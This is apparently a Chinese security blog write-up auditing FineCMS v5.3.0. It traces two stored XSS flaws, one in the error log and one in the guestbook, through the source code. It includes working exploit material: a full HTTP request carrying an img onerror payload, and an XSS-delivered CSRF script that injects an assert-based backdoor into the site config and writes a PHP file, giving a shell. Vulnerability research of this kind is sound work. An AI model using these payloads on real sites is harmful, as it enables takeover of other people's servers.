**0x00 背景**

上周，发现了finecms的一些后台的洞，斗哥先从配置文件写入开始分析，然后再结合本篇的存储XSS进行GetShell，本篇分析下存储XSS的问题，最终通过这两类洞的组合利用GetShell，期待与师傅们的交流讨论。

 **0x01 审计过程**

0x00 相关环境

源码信息：FineCMS v5.3.0 bulid 20180206

问题文件： \finecms\finecms\system\core\Log.php

漏洞类型：存储型XSS

站点地址：<http://www.finecms.net/>

0x01 漏洞分析

在\finecms\finecms\system\core\Log.php文件中的第170-237行中,发现write_log方法，通过分析代码发现传入的$msg变量在传递到fwrite方法中的过程没有经过安全处理，直接写到文件中，可能存在文件写入的问题。

![问题 1.png](https://image.3001.net/images/20180314/15210107979136.png!small)

![问题 2.png](https://image.3001.net/images/20180314/15210108065026.png!small)

通过寻找write_log方法被调用的位置，在\finecms\finecms\system\core\Common.php文件中的第469行中发现被调用的位置。

![位置.png](https://image.3001.net/images/20180314/15210108282594.png!small)

寻找log_message方法被调用的位置，发现log_message被调用的位置很多，现在以如下文件中的代码分析为例，在\finecms\finecms\system\core\Exceptions.php文件中的show_404方法的第135行中的代码调用了log_message。

![loh.png](https://image.3001.net/images/20180314/1521010856142.png!small)

寻找show_404方法被调用的位置，在\finecms\finecms\system\core\CodeIgniter.php文件中的第494行发现调用的位置，且传入的数据是$RTR->directory.$class.'/'.$method,通过分析该文件的代码可以知道$class和$method是在传入参数值后在router中未找到相应的文件或方法的值，然后将这些数据进行拼接，通过show_404方法去调用log_message再调用write_log写入到日志文件中，因此存在文件写入问题。

![xieru.png](https://image.3001.net/images/20180314/15210108773130.png!small)

由于此处写入的文件\finecms\cache\errorlog\log-2018-02-28.php中的PHP代码在exit之后，所以需要在某些操作下才能触发我们写入的PHP代码。

![php.png](https://image.3001.net/images/20180314/15210108998996.png!small)

所以此处的漏洞可以有两种用法，一种是写入php代码，然后坐等管理员登录后台进行”某些操作”，从而触发PHP代码，另一只方式是写入前端代码类似![1](1)
通过xss，在管理员浏览错误日志的时候直接进行可以触发PHP代码的操作请求，这里可以结合文件本漏洞或其他漏洞进行GetShell，这里的”某些操作”我进行简要的分析并没有发现，如果有师傅发现了请也告诉我下。

0x02 漏洞复现

例如,进行以下请求[http://127.0.0.1/index.php?c=mail&m=test](http://127.0.0.1/index.php?c=mail&m=test)&id=1&0.3873487753402759将前端代码写到日志中。

![rizhi.png](https://image.3001.net/images/20180314/15210110487598.png!small)

当管理员进入后台访问错误日志的时候就会触发XSS，这里输出的代码分析就不做了，本身就没有编码输出。

![shuchu.png](https://image.3001.net/images/20180314/15210110728863.png!small)

然后可以利用这个XSS进行GetShell。

首先构造如下ajax。

    
    
    function csrf_shell()
    
    {
    
    var xmlhttp1=new XMLHttpRequest();
    
    xmlhttp1.open("POST","/admin.php?c=site&m=index",true);
    
    xmlhttp1.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    
    xmlhttp1.send("ids[]=1&data[1][name]=FineCMS&data[1][domain]=127.0.0.1'=>1).die($_GET['func']($_GET['evil'])//");
    
    var xmlhttp2=new XMLHttpRequest();
    
    xmlhttp2.open("POST","/admin.php?c=site&m=index&func=assert&evil=fwrite(fopen('evil.php', 'w'),'<?php phpinfo();?>')",true);
    
    xmlhttp2.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    
    xmlhttp2.send("ids[]=1&data[1][name]=FineCMS&data[1][domain]=127.0.0.1'=>1).die($_GET['func']($_GET['evil'])//");
    
    };
    
    csrf_shell();
    

然后进行如下请求将前端代码写入日志文件中,

[http://127.0.0.1/index.php?c=mail&m=test](http://127.0.0.1/index.php?c=mail&m=test)

当管理员查看错误日志的时候就能够GetShell。

![shell1.png](https://image.3001.net/images/20180314/15210111794766.png!small)  

![shell 2.png](https://image.3001.net/images/20180314/152101119517.png!small)  

  

1x00 相关环境

源码信息：FineCMS v5.3.0 bulid 20180206

问题文件： \finecms\finecms\dayrui\core\M_Controller.php

漏洞类型：存储型XSS

站点地址：<http://www.finecms.net/>

  

1x01 漏洞分析

在测试FineCMS的时候，发现留言的时候直接发送html代码，因此可能存在存储xss，通过数据流的跟踪，得知在FineCMS留言板中默认情况下是未对输入的字符进行XSS安全处理的，首先分析下留言内容存入数据库的操作。

分析输入的代码，在\finecms\finecms\dayrui\controllers\Form.php文件的第53行，将传入的$data使用new_addc方法进行数据库insert操作，其中$data便是用户提交的可控字符，这里仅需要这么理解即可，因为实际情况数据传递比较复杂。

![fuza.png](https://image.3001.net/images/20180314/15210112274403.png!small)  

通过反现跟踪\finecms\finecms\dayrui\controllers\Form.php文件中的$data数据，得知是由$this->validate_filter($this->form['field']);得到的。

![dedao.png](https://image.3001.net/images/20180314/15210112504462.png!small)  

跟入validate_filter方法，在\finecms\finecms\dayrui\core\M_Controller.php文件中的第952行中发现该方法,这里主要看问题代码，这里$field['fieldtype']的值为Ueditor因此得到的值是1，然后在第985行中，当$validate['xss']为1的时候是不会进行XSS的安全检测的。

![jiance.png](https://image.3001.net/images/20180314/15210112753046.png!small)  

分析输出的代码，在文件\finecms\finecms\dayrui\controllers\admin\Fcontent.php文件中的第203行中从数据库中获取留言内容。

![neirong.png](https://image.3001.net/images/20180314/15210112972680.png!small)  

跟入get_data方法，在\finecms\finecms\dayrui\models\Form_model.php文件中的第375-388行中,找到该方法代码块，可以看到该方法未对取出的数据进行任何处理。

![chuli.png](https://image.3001.net/images/20180314/15210113337407.png!small)  

继续回到\finecms\finecms\dayrui\controllers\admin\Fcontent.php文件，然后追踪$data在页面回显的代码位置，在第231行中找到输出的代码块。

![daimakuai.png](https://image.3001.net/images/20180314/15210113574638.png!small)  

跟进field_input方法，在\finecms\finecms\dayrui\core\M_Controller.php文件中的第1427行发现代码块。

![faxian.png](https://image.3001.net/images/20180314/15210113819843.png!small)  

继续跟进new_field_input方法，在\finecms\finecms\dayrui\core\M_Controller.php文件中的第1270行中发现该方法的代码块，通过分析和打印的方式进行测试，在第1414行打印$myfield得到回显的页面，是没有经过编码的，因此存在存储型XSS。

![s1.png](https://image.3001.net/images/20180314/1521011420521.png!small)  

![s  2.png](https://image.3001.net/images/20180314/15210114347633.png!small)  

  

1x02 漏洞复现

在前台留言板中进行如下请求：

    
    
    POST /index.php?c=form∣=liuyan HTTP/1.1
    
    Host: 127.0.0.1
    
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
    
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    
    Accept-Encoding: gzip, deflate
    
    Content-Type: application/x-www-form-urlencoded
    
    Content-Length: 93
    
    Referer: [http://127.0.0.1/index.php?c=form∣=liuyan](http://127.0.0.1/index.php?c=form∣=liuyan)
    
    Connection: close
    
    Upgrade-Insecure-Requests: 1
    
    data%5Btitle%5D=4&code=bgsp&data%5Bneirong%5D=<p>3<br/></p><img//onerror="alert`1`"//src="1">
    

然后当管理员访问后台的留言信息的时候便会触发XSS，攻击者可以利用存储XSS对后台漏洞进行攻击利用。

![liyong.png](https://image.3001.net/images/20180314/15210115165274.png!small)  

  

 **0x02 小结**

本篇仅列举了两处存储XSS，与上周的后台文件写入问题的漏洞结合利用便可以GetShell，大家如果有其他方法也欢迎与我一同讨论交流thinking_balabala@163.com，期待与师傅们的各种讨论。

![qrcode_for_gh_223e082fe8a7_344.jpg](https://image.3001.net/images/20180314/15210117024125.jpg!small)  

